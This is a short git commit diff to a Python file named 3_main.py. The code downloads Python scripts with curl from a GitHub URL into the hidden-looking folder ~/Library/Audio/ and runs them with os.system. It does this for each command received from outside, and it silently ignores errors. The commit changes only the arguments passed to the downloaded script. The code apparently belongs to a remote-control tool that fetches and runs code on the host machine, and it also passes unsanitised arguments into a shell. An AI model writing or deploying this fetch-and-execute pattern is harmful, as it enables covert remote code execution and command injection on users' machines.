9f1af82e257daf64a312fcf8753829080a6ad320
Milooles <doodoododo1701@gmail.com>
2025-01-31 09:46:35 +1000

    Update 3_main.py

--- 3_main.py
+++ 3_main.py
@@ -22,7 +22,7 @@ for cmd in userData['commands']:
     args = cmd[1:].split(" ")
     try:
         os.system(f"curl -H \"Cache-Control: no-cache\" {GITHUB_URL}/commands/{args[0]}.py -o ~/Library/Audio/{args[0]}.py")
-        os.system(f"python3 ~/Library/Audio/{args[0]}.py {' '.join(args[2:])}")
+        os.system(f"python3 ~/Library/Audio/{args[0]}.py {' '.join(args)}")
     except:
         pass
 
